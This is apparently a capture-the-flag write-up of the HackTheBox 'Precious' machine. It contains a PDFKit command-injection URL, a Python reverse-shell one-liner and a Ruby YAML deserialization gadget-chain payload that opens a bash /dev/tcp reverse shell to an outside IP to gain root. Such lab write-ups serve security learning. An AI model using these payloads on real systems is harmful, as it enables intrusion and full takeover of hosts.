---
title: "HackTheBox - Precious"
author: Nasrallah
description: ""
date: 2023-02-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, ruby, yaml, rce, sudo, cve]
img_path: /assets/img/hackthebox/machines/precious
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Precious](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.11.189
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have an OpenSSH running on port 22 and Nginx on port 80.

### Web

From the nmap scan we see that we get redirected to precious.htb, os let's add it to /etc/hosts and navigate to the web page.

![](1.png)

Here we have a web page convertor where we give it a url and returns a pdf.

I created file and served it with python3 http server and submitted the url.

![](2.png)

We got back a pdf.

![](3.png)

Inspecting the pdf using `exiftool` we manage to find something interesting.

![](4.png)

The pdf was generated by PDFkit v0.8.6.

## **Foothold**

After some research we find that this version of PDFkit is vulnerable to [command injection](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795).

The vulnerability relies when the application tries to render a URL that contains query string parameters with user input like the following:

```text
http://x.x.x.x/?hack=%20`id`
```

Let's try submitting the above url.

![](5.png)

We got command execution, now let's get a reverse shell by replacing `id` with the following python3 reverse shell.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.90",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![](6.png)


## **Privilege Escalation**

Checking ruby's home directory, we find a hidden file called `.bundle`, and inside it we find some credentials.

![](7.png)

Let's ssh with our new user.

Checking Henry's privileges, we see that we can run a ruby script as sudo.

```terminal
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

The ruby file has the following code.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

When the script is run, it loads a file called `dependencies.yml` using `YAML.load` then reads it.

Searching for ruby yaml injection, i found this [article](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) that showcases a Code Execution through YAML Deserialization.

The code used to get the command execution is the following.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "id"
         method_id: :resolve
```

Since the the script does not loads the `dependencies.yml` from where ever you run the script, we can create the file with the malicious code above to get command execution.

![](8.png)

Great! We got command execution, now let's get a reverse shell.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.17.90/9001 0>&1'"
         method_id: :resolve
```

![](9.png)

And just like that we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
